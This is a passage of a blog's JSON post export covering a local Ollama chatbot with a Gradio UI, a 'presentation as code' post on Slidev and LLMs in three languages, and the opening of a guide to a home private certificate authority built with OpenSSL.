實例並自訂它以符合您的特定需求。無論您是想將對話式 AI 整合到應用程式或專案中的開發者、尋求分析 AI 模型效能的研究人員，還是只是想嘗試這項尖端技術的愛好者 - 控制自己的聊天機器人可以為創新和發現開啟令人興奮的可能性。 無論如何，我想運行自己的 ChatGPT 和 Copilot。 設定 Ollama 首先，您必須設定 Ollama。到目前為止，我還沒有聽到任何關於在任何平台（包括 Windows WSL）上設定 Ollama 困難的抱怨。Ollama 準備好後，拉取一個模型，如 Llama 3： $ # 拉取 5GB 模型可能需要一些時間... $ ollama pull llama3:instruct $ # 列出您擁有的模型 $ ollama list NAME ID SIZE MODIFIED llama3:instruct 71a106a91016 4.7 GB 11 days ago 通過命令列測試模型，儘管措辭可能不同： $ ollama run llama3:instruct &gt;&gt;&gt; Send a message (&#x2F;? for help) &gt;&gt;&gt; are you ready? I&#39;m always ready to play a game, answer questions, or just chat. What&#39;s on your mind? Let me know what you&#39;d like to do and I&#39;ll do my best to help. 檢查 Ollama 的連接埠是否正在監聽： $ netstat -a -n | grep 11434 tcp 0 0 127.0.0.1:11434 0.0.0.0:* LISTEN $ # 看起來不錯，連接埠 11434 已準備好 $ # 如果 Ollama 沒有監聽，請運行以下命令 ollama serve 請查看 https://ollama.com/library 以獲取可用模型清單。 Gradio 雖然您可以設定系統提示、參數、嵌入內容和一些前/後處理，但您可能想要一種更簡單的方式通過網頁介面進行互動。您需要 Gradio。假設您已準備好 Python： $ # 建立 Python 虛擬環境。 $ # gradio-env 是資料夾名稱，您可以將其更改為任何名稱 $ python -m venv gradio-env $ # 進入虛擬環境 $ gradio-env&#x2F;Script&#x2F;activate $ # 如果您使用 Windows $ gradio-env\\script\\activate.bat $ # 安裝 Gradio $ pip install gradio 接下來，建立一個 Python 腳本，檔案名稱如 app.py。如果您使用其他模型，請更新模型： app.pyimport requests import json import gradio as gr model &#x3D; &quot;llama3:instruct&quot; url &#x3D; &quot;http:&#x2F;&#x2F;localhost:11434&#x2F;api&#x2F;&quot; def generate_response(prompt, history): data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;prompt&quot;: prompt&#125; response &#x3D; requests.post( url + &quot;generate&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: return json.loads(response.text)[&quot;response&quot;] else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) demo &#x3D; gr.ChatInterface( fn&#x3D;generate_response ) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: demo.launch() 運行以下命令，您可以使用 URL 訪問介面： $ gradio app.py Watching: ... Running on local URL: http:&#x2F;&#x2F;127.0.0.1:7860 To create a public link, set &#96;share&#x3D;True&#96; in &#96;launch()&#96;. 開啟 http://127.0.0.1:7860 列出模型 假設您已拉取多個模型，並且想從下拉清單中選擇。首先，您從 API 獲取清單： app.pydef list_models(): response &#x3D; requests.get( url + &quot;tags&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, ) if response.status_code &#x3D;&#x3D; 200: models &#x3D; json.loads(response.text)[&quot;models&quot;] return [d[&#39;model&#39;] for d in models] else: print(&quot;Error:&quot;, response.status_code, response.text) models &#x3D; list_models() 然後，您可以將下拉清單添加到 ChatInterface 中： app.pywith gr.Blocks() as demo: dropdown &#x3D; gr.Dropdown(label&#x3D;&#39;Model&#39;, choices&#x3D;models) # 選擇第一個項目作為預設模型 dropdown.value &#x3D; models[0] gr.ChatInterface(fn&#x3D;generate_response, additional_inputs&#x3D;dropdown) 現在 generate_response 函數從 additional_inputs 下拉清單中接受一個額外參數。更新函數： app.pydef generate_response(prompt, history, model): data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;prompt&quot;: prompt&#125; response &#x3D; requests.post( url + &quot;generate&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: return json.loads(response.text)[&quot;response&quot;] else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) 展開額外輸入後，您可以看到下拉清單： 使用聊天歷史記錄 先前的實作使用了 Ollama 的 generate API。該 API 接受一個簡單的參數 prompt，允許將聊天歷史記錄與提示一起發送。然而，最好使用 Ollama 的 chat API，它接受 messages 參數。這個 messages 參數可以指定角色，使模型能夠更好地解釋和相應地回應。下面演示如何將 history 放入 API 格式，最後一條訊息是最新的使用者輸入。 app.pydef generate_response(prompt, history, model): messages &#x3D; [] for u, a in history: messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: u&#125;) messages.append(&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: a&#125;) messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: prompt&#125;) data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;messages&quot;: messages&#125; response &#x3D; requests.post( url + &quot;chat&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: bot_message &#x3D; json.loads(response.text)[&quot;message&quot;][&quot;content&quot;] return bot_message else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) Visual Studio Code 與擴充功能 像 Continue 這樣的擴充功能非常容易設定。 您可以設定 Ollama 或更新擴充功能的 config.json： &quot;models&quot;: [ &#123; &quot;model&quot;: &quot;llama3:instruct&quot;, &quot;title&quot;: &quot;llama3:instruct&quot;, &quot;completionOptions&quot;: &#123;&#125;, &quot;apiBase&quot;: &quot;http:&#x2F;&#x2F;localhost:11434&quot;, &quot;provider&quot;: &quot;ollama&quot; &#125; ], 您可以為本地 copilot 設定模型角色： &quot;modelRoles&quot;: &#123; &quot;default&quot;: &quot;llama3:instruct&quot;, &quot;summarize&quot;: &quot;llama3:instruct&quot; &#125;, 在本地機器外提供 Gradio 或 Ollama API 預設情況下，Gradio 和 Ollama 僅在 localhost 上監聽，這意味著出於安全原因，網路上的其他人無法訪問它們。您可以通過像 Nginx 這樣的代理和 API 閘道提供網頁或 API，以實現傳輸中的資料加密和身份驗證。然而，為了簡單起見，您可以設定以下內容以允許所有 IP 訪問您的本地 Ollama： $ # 配置 Ollama 監聽所有 IP $ sudo echo &quot;[Service]\\nEnvironment&#x3D;\\&quot;OLLAMA_HOST&#x3D;0.0.0.0\\&quot;&quot; &gt; &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;ollama.service.d&#x2F;http-host.conf $ $ sudo systemctl daemon-reload $ sudo systemctl restart ollama $ $ # 如果需要，開啟防火牆 $ sudo ufw allow from any to any port 11434 proto tcp 對於 Gradio，您可以將 server_name 設定為 0.0.0.0： demo.launch(server_name&#x3D;&quot;0.0.0.0&quot;) 如果您通過 WSL 運行 Gradio 和 Ollama，您需要使用 PowerShell 命令將連接埠從 WSL 轉發到本地機器： If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;)) &#123; $arguments &#x3D; &quot;&amp; &#39;&quot; + $myinvocation.mycommand.definition + &quot;&#39;&quot; Start-Process powershell -Verb runAs -ArgumentList $arguments Break &#125; $remoteport &#x3D; bash.exe -c &quot;ifconfig eth0 | grep &#39;inet &#39;&quot; $found &#x3D; $remoteport -match &#39;\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;&#39;; if ($found) &#123; $remoteport &#x3D; $matches[0]; &#125; else &#123; Write-Output &quot;IP address could not be found&quot;; exit; &#125; $ports &#x3D; @(7860,11434); for ($i &#x3D; 0; $i -lt $ports.length; $i++) &#123; $port &#x3D; $ports[$i]; Invoke-Expression &quot;netsh interface portproxy delete v4tov4 listenport&#x3D;$port&quot;; Invoke-Expression &quot;netsh advfirewall firewall delete rule name&#x3D;$port&quot;; Invoke-Expression &quot;netsh interface portproxy add v4tov4 listenport&#x3D;$port connectport&#x3D;$port connectaddress&#x3D;$remoteport&quot;; Invoke-Expression &quot;netsh advfirewall firewall add rule name&#x3D;$port dir&#x3D;in action&#x3D;allow protocol&#x3D;TCP localport&#x3D;$port&quot;; &#125; Invoke-Expression &quot;netsh interface portproxy show v4tov4&quot;; 更新腳本中的連接埠 7860,11434 以符合您自己的需求。7860 用於 Gradio，11434 用於 ollama 玩得開心！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"使用 AI 的程式碼化簡報","slug":"2024/04/Presentation_As_Code_with_AI-zh-TW","date":"un11fin11","updated":"un66fin66","comments":false,"path":"/zh-TW/2024/04/Presentation_As_Code_with_AI/","permalink":"https://neo01.com/zh-TW/2024/04/Presentation_As_Code_with_AI/","excerpt":"探索 Slidev 和 LLM 建立程式碼化簡報，但版面和動畫調整仍是挑戰。","text":"您熟悉「一切皆程式碼」的概念嗎？它指的是使用程式碼來定義、管理和自動化各種系統元件，包括基礎設施、圖表、政策等等。但簡報呢？是否可以使用程式碼來製作令人驚豔且互動式的投影片？ 答案是肯定的，這要歸功於 Slidev，一個讓您使用 Markdown 和 Vue.js 編寫投影片的簡報框架。Slidev 基於程式碼化簡報的理念，這意味著您可以使用您最喜歡的程式碼編輯器、版本控制系統和開發工具來建立和分享您的投影片。 在這篇部落格文章中，我將向您介紹 Slidev，並展示它與 PowerPoint 等傳統簡報工具的比較。我還將探討使用大型語言模型 (LLM) AI 生成簡報程式碼的可能性。 graph LR A[\"傳統工具\"] --> B[\"PowerPoint/Keynote\"] C[\"程式碼化簡報\"] --> D[\"Markdown + Slidev\"] B --> E[\"視覺編輯器\"] D --> F[\"程式碼編輯器 + Git\"] 什麼是程式碼化簡報？ 程式碼化簡報是一種使用程式碼而非圖形使用者介面來建立簡報的方式。與傳統簡報工具相比，它有幾個優點，例如： 您可以使用您偏好的程式碼編輯器和語法突顯 您可以利用程式語言和框架的強大功能和靈活性 您可以重複使用和模組化您的投影片和元件 您可以使用 Git 或其他工具協作和版本控制您的投影片 您可以自動化和自訂您的簡報工作流程 您可以將您的投影片與外部資料來源和 API 整合 當然，程式碼化簡報也有一些缺點，例如： 您需要學習新的語法或框架 您可能會失去一些視覺回饋和互動性 您可能對投影片的版面配置和設計控制較少 您可能會面臨不同瀏覽器和裝置的相容性問題 新增動畫可能具有挑戰性 程式碼化簡報的好處之一是您可以使用任何您喜歡的程式語言或框架。例如，您可以使用 HTML、CSS 和 JavaScript 來建立基於網頁的投影片，或者您可以使用 LaTeX 來建立 PDF 投影片。 然而，如果您正在尋找專為程式碼化簡報設計的特定框架，您可能想查看 Slidev (https://github.com/slidevjs/slidev)。 💡 快速開始想試試 Slidev 嗎？只需執行 npm init slidev 即可建立您的第一個簡報！ 另一個替代方案是在 PowerPoint 中使用 VBA 來建立投影片。然而，與 Markdown 相比，VBA 的可讀性較低。由於本文專注於程式碼化簡報，我將專注於 Slidev。 Slidev 與 LLM 用於簡報的 Slidev Markdown 通常比 HTML/CSS/JavaScript 更簡潔。Markdown 更具可讀性，而 ChatGPT 等 LLM 可以透過提示生成 Markdown，例如：「使用 Slidev 為小學生生成一個關於太陽系的簡報。使用淡出作為轉場。」 結果是一個包含多張投影片的簡潔 Slidev Markdown 簡報： --- title: Solar System transition: fade-out --- # The Solar System --- ## What is the Solar System? The Solar System is made up of the Sun and all the objects that orbit around it. Let&#39;s explore the planets and other fascinating things in our Solar System! --- ## The Sun The Sun is a star at the center of our Solar System. It is a giant ball of hot, glowing gases. The Sun provides light and heat to all the planets. --- ## The Planets | Planet | Description | |----------|-----------------------------------------------------| | Mercury | Closest to the Sun, small and rocky | | Venus | Known as the &quot;evening star,&quot; has a thick atmosphere | | Earth | Our home planet, with land, water, and atmosphere | | Mars | Red planet with polar ice caps and dusty storms | | Jupiter | Largest planet, with colorful stripes and big storms| | Saturn | Known for its beautiful rings made of ice and dust | | Uranus | Tilted on its side, with icy blue color | | Neptune | Cold, blue planet with strong winds | --- ## Other Objects Apart from the Sun and planets, the Solar System also has other interesting objects: - **Moon**: Earth&#39;s natural satellite - **Asteroids**: Rocky objects that orbit the Sun - **Comets**: Icy objects that leave a glowing trail when they get close to the Sun --- ## Fun Facts - The Sun is so big that you can fit more than a million Earths inside it! - Jupiter has a famous storm called the Great Red Spot, which is larger than Earth. - Saturn&#39;s rings are not solid but made up of billions of small pieces of ice and rock. - The Moon is about 1&#x2F;4th the size of Earth and is our closest neighbor in space. --- ## Conclusion The Solar System is a fascinating place with the Sun, planets, and other interesting objects. It&#39;s incredible to learn about the wonders of space! --- # Questions? Feel free to ask any questions you have about the Solar System! 與其他圖像生成 AI 一樣，LLM AI 缺乏人類視角。文字溢位很常見，因為 AI 模型通常被調整為冗長。 ⚠️ 學習曲線雖然 Markdown 比 HTML/CSS 簡單，但您仍然需要學習 Slidev 特定的語法和 Vue.js 以獲得進階功能。 那圖片呢？ 僅使用 LLM 新增圖片非常耗費人力。您必須搜尋合適的圖片、下載它們，並使用檔案名稱和位置更新提示。即使如此，結果也可能無法預測。 那圖表呢？ 您可以使用 Mermaid 建立圖表，但已知的 LLM 並未針對此任務進行最佳化，通常需要手動介入。 那動畫呢？ 在 Slidev 中新增動畫可能具有挑戰性，因為它需要了解 CSS 或 JavaScript 動畫等網頁技術，這對所有使用者來說可能並不直觀。 結論 Slidev 是一個創新的工具，可以使用程式碼建立簡報，但它也有自己的一系列挑戰。即使有大型語言模型的協助，使用者在編寫投影片的版面配置、設計和動畫時仍然經常面臨困難。調整元素以調整大小並適合最佳的人類可讀性可能特別令人沮喪且耗時。此外，新增動畫以使簡報更具吸引力仍然是一項複雜的任務。儘管有這些障礙，Slidev 仍提供了顯著的好處，包括靈活性、互動性以及與其他網頁技術的相容性。對於那些尋求透過程式碼呈現想法的新穎方式的人來說，Slidev 絕對值得探索。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Presentation as Code","slug":"Presentation-as-Code","permalink":"https://neo01.com/tags/Presentation-as-Code/"},{"name":"Slidev","slug":"Slidev","permalink":"https://neo01.com/tags/Slidev/"}],"lang":"zh-TW"},{"title":"使用 AI 的代码化演示","slug":"2024/04/Presentation_As_Code_with_AI-zh-CN","date":"un11fin11","updated":"un66fin66","comments":false,"path":"/zh-CN/2024/04/Presentation_As_Code_with_AI/","permalink":"https://neo01.com/zh-CN/2024/04/Presentation_As_Code_with_AI/","excerpt":"探索 Slidev 和 LLM 创建代码化演示，但布局和动画调整仍是挑战。","text":"您熟悉&quot;一切皆代码&quot;的概念吗？它指的是使用代码来定义、管理和自动化各种系统组件，包括基础设施、图表、策略等等。但演示呢？是否可以使用代码来制作令人惊艳且交互式的幻灯片？ 答案是肯定的，这要归功于 Slidev，一个让您使用 Markdown 和 Vue.js 编写幻灯片的演示框架。Slidev 基于代码化演示的理念，这意味着您可以使用您最喜欢的代码编辑器、版本控制系统和开发工具来创建和分享您的幻灯片。 在这篇博客文章中，我将向您介绍 Slidev，并展示它与 PowerPoint 等传统演示工具的比较。我还将探讨使用大型语言模型 (LLM) AI 生成演示代码的可能性。 graph LR A[\"传统工具\"] --> B[\"PowerPoint/Keynote\"] C[\"代码化演示\"] --> D[\"Markdown + Slidev\"] B --> E[\"视觉编辑器\"] D --> F[\"代码编辑器 + Git\"] 什么是代码化演示？ 代码化演示是一种使用代码而非图形用户界面来创建演示的方式。与传统演示工具相比，它有几个优点，例如： 您可以使用您偏好的代码编辑器和语法突显 您可以利用编程语言和框架的强大功能和灵活性 您可以重复使用和模块化您的幻灯片和组件 您可以使用 Git 或其他工具协作和版本控制您的幻灯片 您可以自动化和自定义您的演示工作流程 您可以将您的幻灯片与外部数据源和 API 集成 当然，代码化演示也有一些缺点，例如： 您需要学习新的语法或框架 您可能会失去一些视觉反馈和交互性 您可能对幻灯片的布局和设计控制较少 您可能会面临不同浏览器和设备的兼容性问题 添加动画可能具有挑战性 代码化演示的好处之一是您可以使用任何您喜欢的编程语言或框架。例如，您可以使用 HTML、CSS 和 JavaScript 来创建基于网页的幻灯片，或者您可以使用 LaTeX 来创建 PDF 幻灯片。 然而，如果您正在寻找专为代码化演示设计的特定框架，您可能想查看 Slidev (https://github.com/slidevjs/slidev)。 💡 快速开始想试试 Slidev 吗？只需执行 npm init slidev 即可创建您的第一个演示！ 另一个替代方案是在 PowerPoint 中使用 VBA 来创建幻灯片。然而，与 Markdown 相比，VBA 的可读性较低。由于本文专注于代码化演示，我将专注于 Slidev。 Slidev 与 LLM 用于演示的 Slidev Markdown 通常比 HTML/CSS/JavaScript 更简洁。Markdown 更具可读性，而 ChatGPT 等 LLM 可以通过提示生成 Markdown，例如：“使用 Slidev 为小学生生成一个关于太阳系的演示。使用淡出作为转场。” 结果是一个包含多张幻灯片的简洁 Slidev Markdown 演示： --- title: Solar System transition: fade-out --- # The Solar System --- ## What is the Solar System? The Solar System is made up of the Sun and all the objects that orbit around it. Let&#39;s explore the planets and other fascinating things in our Solar System! --- ## The Sun The Sun is a star at the center of our Solar System. It is a giant ball of hot, glowing gases. The Sun provides light and heat to all the planets. --- ## The Planets | Planet | Description | |----------|-----------------------------------------------------| | Mercury | Closest to the Sun, small and rocky | | Venus | Known as the &quot;evening star,&quot; has a thick atmosphere | | Earth | Our home planet, with land, water, and atmosphere | | Mars | Red planet with polar ice caps and dusty storms | | Jupiter | Largest planet, with colorful stripes and big storms| | Saturn | Known for its beautiful rings made of ice and dust | | Uranus | Tilted on its side, with icy blue color | | Neptune | Cold, blue planet with strong winds | --- ## Other Objects Apart from the Sun and planets, the Solar System also has other interesting objects: - **Moon**: Earth&#39;s natural satellite - **Asteroids**: Rocky objects that orbit the Sun - **Comets**: Icy objects that leave a glowing trail when they get close to the Sun --- ## Fun Facts - The Sun is so big that you can fit more than a million Earths inside it! - Jupiter has a famous storm called the Great Red Spot, which is larger than Earth. - Saturn&#39;s rings are not solid but made up of billions of small pieces of ice and rock. - The Moon is about 1&#x2F;4th the size of Earth and is our closest neighbor in space. --- ## Conclusion The Solar System is a fascinating place with the Sun, planets, and other interesting objects. It&#39;s incredible to learn about the wonders of space! --- # Questions? Feel free to ask any questions you have about the Solar System! 与其他图像生成 AI 一样，LLM AI 缺乏人类视角。文本溢出很常见，因为 AI 模型通常被调整为冗长。 ⚠️ 学习曲线虽然 Markdown 比 HTML/CSS 简单，但您仍然需要学习 Slidev 特定的语法和 Vue.js 以获得高级功能。 那图片呢？ 仅使用 LLM 添加图片非常耗费人力。您必须搜索合适的图片、下载它们，并使用文件名和位置更新提示。即使如此，结果也可能无法预测。 那图表呢？ 您可以使用 Mermaid 创建图表，但已知的 LLM 并未针对此任务进行优化，通常需要手动干预。 那动画呢？ 在 Slidev 中添加动画可能具有挑战性，因为它需要了解 CSS 或 JavaScript 动画等网页技术，这对所有用户来说可能并不直观。 结论 Slidev 是一个创新的工具，可以使用代码创建演示，但它也有自己的一系列挑战。即使有大型语言模型的协助，用户在编写幻灯片的布局、设计和动画时仍然经常面临困难。调整元素以调整大小并适合最佳的人类可读性可能特别令人沮丧且耗时。此外，添加动画以使演示更具吸引力仍然是一项复杂的任务。尽管有这些障碍，Slidev 仍提供了显著的好处，包括灵活性、交互性以及与其他网页技术的兼容性。对于那些寻求通过代码呈现想法的新颖方式的人来说，Slidev 绝对值得探索。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Presentation as Code","slug":"Presentation-as-Code","permalink":"https://neo01.com/tags/Presentation-as-Code/"},{"name":"Slidev","slug":"Slidev","permalink":"https://neo01.com/tags/Slidev/"}],"lang":"zh-CN"},{"title":"Presentation as Code with AI","slug":"2024/04/Presentation_As_Code_with_AI","date":"un11fin11","updated":"un66fin66","comments":false,"path":"2024/04/Presentation_As_Code_with_AI/","permalink":"https://neo01.com/2024/04/Presentation_As_Code_with_AI/","excerpt":"Explore Slidev and LLMs for presentation-as-code, but layout adjustments and animations remain challenging even with AI assistance.","text":"Are you familiar with the concept of “everything as code”? It refers to using code to define, manage, and automate various system components, including infrastructure, diagrams, policies, and beyond. But what about presentations? Is it possible to use code to craft stunning and interactive slides? The answer is yes, thanks to Slidev, a presentation framework that lets you write slides using Markdown and Vue.js. Slidev is based on the idea of presentation as code, which means that you can use your favorite code editor, version control system, and development tools to create and share your slides. In this blog post, I will introduce you to Slidev and show you how it compares to traditional presentation tools like PowerPoint. I will also explore the possibility of generating presentation code with large language model (LLM) AI. graph LR A[\"Traditional Tools\"] --> B[\"PowerPoint/Keynote\"] C[\"Presentation as Code\"] --> D[\"Markdown + Slidev\"] B --> E[\"Visual Editor\"] D --> F[\"Code Editor + Git\"] What is Presentation as Code? Presentation as code is a way of creating presentations using code instead of graphical user interfaces. It has several advantages over traditional presentation tools, such as: You can use your preferred code editor and syntax highlighting You can leverage the power and flexibility of programming languages and frameworks You can reuse and modularize your slides and components You can collaborate and version control your slides using Git or other tools You can automate and customize your presentation workflow You can integrate your slides with external data sources and APIs Of course, presentation as code also has some drawbacks, such as: You need to learn a new syntax or framework You may lose some visual feedback and interactivity You may have less control over the layout and design of your slides You may face compatibility issues with different browsers and devices. Adding animations can be challenging. One of the benefits of presentation as code is that you can use any programming language or framework that you like. For example, you can use HTML, CSS, and JavaScript to create web-based slides, or you can use LaTeX to create PDF slides. However, if you are looking for a specific framework that is designed for presentation as code, you may want to check out Slidev (https://github.com/slidevjs/slidev). 💡 Quick StartWant to try Slidev? Simply run npm init slidev to create your first presentation! Another alternative is using VBA in PowerPoint to create slides. However, VBA is less human-readable compared to Markdown. As this post focuses on presentation as code, I will concentrate on Slidev. Slidev with LLM Slidev Markdown for presentations is often cleaner than HTML/CSS/JavaScript. Markdown is more human-readable, and LLMs such as ChatGPT can generate Markdown with prompts, for example: “Use Slidev to generate a presentation about the solar system for primary school students. Use fade-out for transitions.” The result is a clean Slidev Markdown presentation with multiple slides: --- title: Solar System transition: fade-out --- # The Solar System --- ## What is the Solar System? The Solar System is made up of the Sun and all the objects that orbit around it. Let&#39;s explore the planets and other fascinating things in our Solar System! --- ## The Sun The Sun is a star at the center of our Solar System. It is a giant ball of hot, glowing gases. The Sun provides light and heat to all the planets. --- ## The Planets | Planet | Description | |----------|----------------------------------------------------| | Mercury | Closest to the Sun, small and rocky | | Venus | Known as the &quot;evening star,&quot; has a thick atmosphere | | Earth | Our home planet, with land, water, and atmosphere | | Mars | Red planet with polar ice caps and dusty storms | | Jupiter | Largest planet, with colorful stripes and big storms| | Saturn | Known for its beautiful rings made of ice and dust | | Uranus | Tilted on its side, with icy blue color | | Neptune | Cold, blue planet with strong winds | --- ## Other Objects Apart from the Sun and planets, the Solar System also has other interesting objects: - **Moon**: Earth&#39;s natural satellite - **Asteroids**: Rocky objects that orbit the Sun - **Comets**: Icy objects that leave a glowing trail when they get close to the Sun --- ## Fun Facts - The Sun is so big that you can fit more than a million Earths inside it! - Jupiter has a famous storm called the Great Red Spot, which is larger than Earth. - Saturn&#39;s rings are not solid but made up of billions of small pieces of ice and rock. - The Moon is about 1&#x2F;4th the size of Earth and is our closest neighbor in space. --- ## Conclusion The Solar System is a fascinating place with the Sun, planets, and other interesting objects. It&#39;s incredible to learn about the wonders of space! --- # Questions? Feel free to ask any questions you have about the Solar System! Like other image generation AIs, LLM AI lacks a human perspective. Text overflow is common because AI models are often tuned to be verbose. ⚠️ Learning CurveWhile Markdown is simpler than HTML/CSS, you'll still need to learn Slidev-specific syntax and Vue.js for advanced features. What about images? Adding images with LLM alone is very labor-intensive. You must search for suitable images, download them, and update the prompt with the filename and placement. Even then, the results can be unpredictable. What about charts? You can create charts with Mermaid, but known LLMs are not optimized for this task, often requiring manual intervention. What about animation? Adding animations in Slidev can be challenging as it requires understanding of web technologies like CSS or JavaScript animations, which may not be straightforward for all users. Conclusion Slidev is an innovative tool for creating presentations with code, but it comes with its own set of challenges. Even with the assistance of large language models, users often face difficulties in coding the layout, design, and animations of slides. Adjusting elements to resize and fit for optimal human readability can be particularly frustrating and time-consuming. Moreover, adding animations to make presentations more engaging remains a complex task. Despite these hurdles, Slidev offers significant benefits, including flexibility, interactivity, and compatibility with other web technologies. For those seeking a novel way to present ideas through code, Slidev is definitely worth exploring.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Presentation as Code","slug":"Presentation-as-Code","permalink":"https://neo01.com/tags/Presentation-as-Code/"},{"name":"Slidev","slug":"Slidev","permalink":"https://neo01.com/tags/Slidev/"}]},{"title":"在家中建立私有证书授权中心","slug":"2024/03/Private-CA-at-Home-zh-CN","date":"un55fin55","updated":"un00fin00","comments":false,"path":"/zh-CN/2024/03/Private-CA-at-Home/","permalink":"https://neo01.com/zh-CN/2024/03/Private-CA-at-Home/","excerpt":"厌倦了家庭实验室服务的浏览器警告？学习如何建立自己的证书授权中心，为内部服务签发受信任的 SSL 证书。","text":"你已经建立了一个漂亮的家庭实验室，包含多个服务——Nextcloud、Home Assistant、Plex，也许还有 NAS。一切运作良好，除了一件烦人的事：每次通过 HTTPS 访问这些服务时，浏览器都会大喊&quot;你的连接不是私人连接！&quot; 当然，你可以每次都点击&quot;高级&quot;和&quot;继续前往&quot;。但如果我告诉你有更好的方法呢？欢迎来到私有证书授权中心的世界。 为什么需要私有 CA 问题所在： 当你访问 https://192.168.1.100 或 https://homeserver.local 时，浏览器不信任该连接，因为： 自签证书默认不受信任 公开 CA（Let’s Encrypt、DigiCert）不会为私有 IP 地址或 .local 域名签发证书 每次点击跳过安全警告会失去 HTTPS 的意义 解决方案： 建立你自己的证书授权中心（CA），它可以： 为你的内部服务签发证书 安装后被你所有设备信任 离线运作，无需外部依赖 让你完全控制证书生命周期 理解基础概念 什么是证书授权中心？ CA 是签发数字证书的实体。当你的浏览器信任某个 CA 时，它会自动信任该 CA 签署的任何证书。 信任链： flowchart TD A[\"🏛️ 根 CA(你的私有 CA)\"] --> B[\"📜 中继 CA(可选)\"] B --> C[\"🔒 服务器证书(homeserver.local)\"] B --> D[\"🔒 服务器证书(nas.local)\"] B --> E[\"🔒 服务器证书(192.168.1.100)\"] F[\"💻 你的设备\"] -.->|\"信任\"| A F -->|\"自动信任\"| C F -->|\"自动信任\"| D F -->|\"自动信任\"| E style A fill:#e3f2fd style B fill:#f3e5f5 style C fill:#e8f5e9 style D fill:#e8f5e9 style E fill:#e8f5e9 style F fill:#fff3e0 根 CA vs 中继 CA 根 CA： 最高层级的授权中心。保持离线并确保安全。 中继 CA： 签署实际证书。可以撤销而不影响根 CA。 服务器证书： 你的服务用于 HTTPS 的证书。 💡 最佳实践使用两层架构：根 CA → 中继 CA → 服务器证书。这样，如果中继 CA 被入侵，你可以撤销它而无需在所有设备上重新信任根 CA。 建立你的私有 CA 方法 1：使用 OpenSSL（手动控制） 步骤 1：建立根 CA # 生成根 CA 私钥（务必妥善保管！） openssl genrsa -aes256 -out root-ca.key 4096 # 建立根 CA 证书（有效期 10 年） openssl req -x509 -new -nodes -key root-ca.key -sha256 -days 3650 \\ -out root-ca.crt \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;Home Lab Root CA&quot; 步骤 2：建立中继 CA # 生成中继 CA 私钥 openssl genrsa -aes256 -out intermediate-ca.key 4096 # 建立证书签署请求（CSR） openssl req -new -key intermediate-ca.key -out intermediate-ca.csr \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;Home Lab Intermediate CA&quot; # 使用根 CA 签署中继 CA openssl x509 -req -in intermediate-ca.csr -CA root-ca.crt -CAkey root-ca.key \\ -CAcreateserial -out intermediate-ca.crt -days 1825 -sha256 \\ -extfile &lt;(echo &quot;basicConstraints&#x3D;CA:TRUE&quot;) 步骤 3：签发服务器证书 # 生成服务器私钥 openssl genrsa -out homeserver.key 2048 # 为服务器建立 CSR openssl req -new -key homeserver.key -out homeserver.csr \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;homeserver.local&quot; # 建立 SAN（主体别名）配置 cat &gt; san.cnf &lt;&lt;EOF [req] distinguished_name &#x3D; req_distinguished_name req_extensions &#x3D; v3_req [req_distinguished_name] [v3_req] subjectAltName &#x3D; @alt_names [alt_names] DNS.1 &#x3D; homeserver.local DNS.2 &#x3D; homeserver IP.1 &#x3D; 192.168.1.100 EOF # 使用中继 CA 签署服务器证书 openssl x509 -req -in homeserver.csr -CA intermediate-ca.crt \\ -CAkey intermediate-ca.key -CAcreateserial -out homeserver.crt \\ -days 365 -sha256 -extfile san.cnf -extensions v3_req 方法 2：使用 easy-rsa（简化版） # 安装 easy-rsa git clone https:&#x2F;&#x2F;github.com&#x2F;OpenVPN&#x2F;easy-rsa.git cd easy-rsa&#x2F;easyrsa3 # 初始化 PKI .&#x2F;easyrsa init-pki # 建立 CA 